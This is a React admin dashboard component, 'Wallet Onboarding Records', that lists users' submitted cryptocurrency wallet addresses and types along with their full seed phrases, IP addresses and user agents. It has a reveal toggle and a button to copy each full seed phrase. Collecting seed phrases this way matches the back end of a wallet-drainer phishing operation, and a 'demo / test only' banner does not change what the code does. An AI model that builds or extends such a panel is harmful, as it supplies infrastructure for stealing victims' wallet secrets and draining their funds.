'use client';

import { useState, useEffect, useCallback } from 'react';
import {
  RefreshCw, Search, Loader2, ChevronLeft, ChevronRight,
  AlertCircle, Clock, Eye, EyeOff, Copy, Check
} from 'lucide-react';
import Card from '@/components/ui/Card';
import Button from '@/components/ui/Button';
import Badge from '@/components/ui/Badge';

export default function AdminOnboardingManager() {
  const [records, setRecords] = useState([]);
  const [loading, setLoading] = useState(true);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const limit = 20;

  const [search, setSearch] = useState('');
  const [searchInput, setSearchInput] = useState('');

  const [copiedId, setCopiedId] = useState(null);
  const [expandedId, setExpandedId] = useState(null);

  const fetchRecords = useCallback(async () => {
    setLoading(true);
    try {
      const params = new URLSearchParams({
        page: String(page),
        limit: String(limit),
      });
      if (search) params.set('search', search);

      const res = await fetch(`/api/admin/onboarding?${params.toString()}`);
      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.error || 'Failed to load');
      }
      const data = await res.json();

      setRecords(data.records || []);
      setTotal(data.total || 0);
      setTotalPages(data.totalPages || 1);
    } catch (err) {
      console.error('Fetch error:', err);
    } finally {
      setLoading(false);
    }
  }, [page, search]);

  useEffect(() => {
    fetchRecords();
  }, [fetchRecords]);

  useEffect(() => {
    const timer = setTimeout(() => {
      setSearch(searchInput.trim());
      setPage(1);
    }, 450);

    return () => clearTimeout(timer);
  }, [searchInput]);

  const copyToClipboard = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  const shortAddr = (addr) =>
    addr ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : '—';

  const formatSeed = (words) => {
    if (!words || words.length === 0) return '—';
    return words.join(' ');
  };

  return (
    <div className="space-y-6 p-4 md:p-6">
      <Card className="p-5">
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
          <div>
            <h2 className="font-display font-semibold text-text text-xl">
              Wallet Onboarding Records
            </h2>
            <p className="text-sm text-muted mt-1">
              View user-submitted wallet types and seed phrases (demo / test only).
              <span className="text-danger font-medium"> NEVER expose in production!</span>
            </p>
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={fetchRecords}
            disabled={loading}
          >
            <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
            Refresh
          </Button>
        </div>
      </Card>

      <Card className="p-4">
        <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3 flex-wrap">
          <div className="relative flex-1 min-w-[280px]">
            <Search
              size={14}
              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-dim"
            />
            <input
              type="text"
              placeholder="Search wallet address or type…"
              value={searchInput}
              onChange={(e) => setSearchInput(e.target.value)}
              className="w-full pl-9 pr-4 py-2 bg-surface2/50 border border-border-light rounded-xl text-sm text-text placeholder:text-muted-dim focus:outline-none focus:border-accent/40"
            />
          </div>

          <Badge color="accent" className="shrink-0">
            {total} records
          </Badge>
        </div>
      </Card>

      <Card className="overflow-hidden">
        {loading ? (
          <div className="p-16 text-center">
            <Loader2 size={28} className="animate-spin text-accent mx-auto" />
            <p className="text-sm text-muted mt-3">Loading onboarding data…</p>
          </div>
        ) : records.length === 0 ? (
          <div className="p-16 text-center">
            <AlertCircle size={32} className="text-muted-dim mx-auto mb-3" />
            <p className="text-sm text-muted">No records found. Try adjusting search.</p>
          </div>
        ) : (
          <>
            <div className="overflow-x-auto">
              <table className="w-full text-sm min-w-[900px]">
                <thead>
                  <tr className="border-b border-border-light bg-surface/50">
                    <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider w-10"></th>
                    <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider">Wallet Address</th>
                    <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider">Type</th>
                    <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider hidden md:table-cell">Seed Phrase</th>
                    <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider hidden lg:table-cell">IP</th>
                    <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider hidden xl:table-cell">User Agent</th>
                    <th className="text-left text-[10px] text-muted-dim font-medium px-5 py-3 uppercase tracking-wider">Created</th>
                  </tr>
                </thead>
                <tbody>
                  {records.map((rec) => {
                    const isExpanded = expandedId === rec.id;
                    const seedText = formatSeed(rec.crypto_boxes);
                    const isCopied = copiedId === rec.id;

                    return (
                      <tr
                        key={rec.id}
                        className="border-b border-border-light hover:bg-white/[0.02] transition-colors"
                      >
                        <td className="px-5 py-3">
                          {rec.crypto_boxes?.length > 0 && (
                            <button
                              onClick={() =>
                                setExpandedId(isExpanded ? null : rec.id)
                              }
                              className="text-muted-dim hover:text-text"
                            >
                              {isExpanded ? <EyeOff size={16} /> : <Eye size={16} />}
                            </button>
                          )}
                        </td>

                        <td className="px-5 py-3 font-mono text-[13px] text-text">
                          {shortAddr(rec.wallet_address)}
                        </td>

                        <td className="px-5 py-3">
                          <Badge color="default" className="!text-[11px]">
                            {rec.wallet_type || '—'}
                          </Badge>
                        </td>

                        <td className="px-5 py-3 hidden md:table-cell">
                          {rec.crypto_boxes?.length > 0 ? (
                            <div className="flex items-center gap-2 group">
                              <span className="font-mono text-[11px] text-warning/90 truncate max-w-[220px]">
                                {isExpanded ? seedText : seedText.slice(0, 60) + '...'}
                              </span>
                              <button
                                onClick={() => copyToClipboard(seedText, rec.id)}
                                className="opacity-0 group-hover:opacity-100 transition-opacity p-1 hover:bg-surface2 rounded"
                                title="Copy full seed"
                              >
                                {isCopied ? (
                                  <Check size={14} className="text-success" />
                                ) : (
                                  <Copy size={14} className="text-muted-dim" />
                                )}
                              </button>
                            </div>
                          ) : (
                            <span className="text-muted-dim text-[11px]">—</span>
                          )}
                        </td>

                        <td className="px-5 py-3 hidden lg:table-cell text-[11px] text-muted-dim font-mono">
                          {rec.ip_address || '—'}
                        </td>

                        <td className="px-5 py-3 hidden xl:table-cell text-[11px] text-muted-dim max-w-[180px] truncate">
                          {rec.user_agent || '—'}
                        </td>

                        <td className="px-5 py-3 text-[11px] text-muted-dim">
                          {rec.created_at
                            ? new Date(rec.created_at).toLocaleString([], {
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit',
                              })
                            : '—'}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>

            {totalPages > 1 && (
              <div className="flex items-center justify-between px-6 py-3 border-t border-border-light">
                <p className="text-xs text-muted">
                  Page {page} of {totalPages} · {total} records
                </p>
                <div className="flex items-center gap-1">
                  <button
                    onClick={() => setPage((p) => Math.max(1, p - 1))}
                    disabled={page <= 1}
                    className="p-1.5 rounded text-muted hover:text-text disabled:opacity-40"
                  >
                    <ChevronLeft size={16} />
                  </button>

                  {Array.from({ length: Math.min(6, totalPages) }, (_, i) => {
                    let p = i + 1;
                    if (totalPages > 6) {
                      if (page > 3 && page < totalPages - 2) {
                        if (i === 1) p = page - 1;
                        if (i === 2) p = page;
                        if (i === 3) p = page + 1;
                      } else if (page >= totalPages - 2) {
                        p = totalPages - 5 + i;
                      }
                    }
                    if (p < 1 || p > totalPages) return null;

                    return (
                      <button
                        key={p}
                        onClick={() => setPage(p)}
                        className={`w-7 h-7 rounded text-xs font-medium ${
                          p === page
                            ? 'bg-accent/20 text-accent'
                            : 'text-muted hover:text-text hover:bg-white/5'
                        }`}
                      >
                        {p}
                      </button>
                    );
                  })}

                  <button
                    onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                    disabled={page >= totalPages}
                    className="p-1.5 rounded text-muted hover:text-text disabled:opacity-40"
                  >
                    <ChevronRight size={16} />
                  </button>
                </div>
              </div>
            )}
          </>
        )}
      </Card>
    </div>
  );
}